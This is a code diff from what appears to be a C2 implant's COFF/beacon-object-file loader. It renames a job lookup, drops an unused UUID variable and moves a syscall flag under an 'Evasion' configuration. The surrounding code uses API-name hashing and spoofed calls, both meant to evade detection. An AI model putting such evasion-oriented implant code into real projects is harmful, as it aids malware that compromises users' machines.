@@ -27,10 +27,8 @@ auto DECLFN Coff::Output(
 
     VOID* MemRange  = __builtin_return_address( 0 );
     ULONG CommandID = 0;
-    CHAR* UUID      = nullptr;
 
     CommandID = Self->Cf->GetCmdID( MemRange );
-    UUID      = Self->Cf->GetTask( MemRange );
     
     Self->Pkg->SendOut( type, CommandID, (BYTE*)data, len );
 }
@@ -435,7 +433,7 @@ auto DECLFN Coff::PkgInt8(
     if ( ! UUID ) {
         Pkg = Self->Pkg->Shared;
     } else {
-        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        JOBS* Job = Self->Jbs->GetById( UUID );
         Pkg = Job->Pkg;
     }
 
@@ -453,7 +451,7 @@ auto DECLFN Coff::PkgInt16(
     if ( ! UUID ) {
         Pkg = Self->Pkg->Shared;
     } else {
-        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        JOBS* Job = Self->Jbs->GetById( UUID );
         Pkg = Job->Pkg;
     }
 
@@ -471,7 +469,7 @@ auto DECLFN Coff::PkgInt32(
     if ( ! UUID ) {
         Pkg = Self->Pkg->Shared;
     } else {
-        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        JOBS* Job = Self->Jbs->GetById( UUID );
         Pkg = Job->Pkg;
     }
 
@@ -489,7 +487,7 @@ auto DECLFN Coff::PkgInt64(
     if ( ! UUID ) {
         Pkg = Self->Pkg->Shared;
     } else {
-        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        JOBS* Job = Self->Jbs->GetById( UUID );
         Pkg = Job->Pkg;
     }
 
@@ -508,7 +506,7 @@ auto DECLFN Coff::PkgBytes(
     if ( ! UUID ) {
         Pkg = Self->Pkg->Shared;
     } else {
-        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        JOBS* Job = Self->Jbs->GetById( UUID );
         Pkg = Job->Pkg;
     }
 
@@ -655,7 +653,7 @@ auto DECLFN Coff::CoInitialize(
 
     HRESULT(*khCoInitialize)(PVOID) = (decltype(khCoInitialize))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitialize") );
 
-    if ( Self->Config.Syscall ) {
+    if ( Self->Config.Evasion.Syscall ) {
         return (HRESULT)Self->Spf->Call( (UPTR)khCoInitialize, 0, (UPTR)pvReserved );
     }
 
@@ -670,7 +668,7 @@ auto DECLFN Coff::CoInitializeEx(
 
     HRESULT(*khCoInitializeEx)(PVOID, DWORD) = (decltype(khCoInitializeEx))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitializeEx") );
 
-    if ( Self->Config.Syscall ) {
+    if ( Self->Config.Evasion.Syscall ) {
         return (HRESULT)Self->Spf->Call( (UPTR)khCoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
     }
 
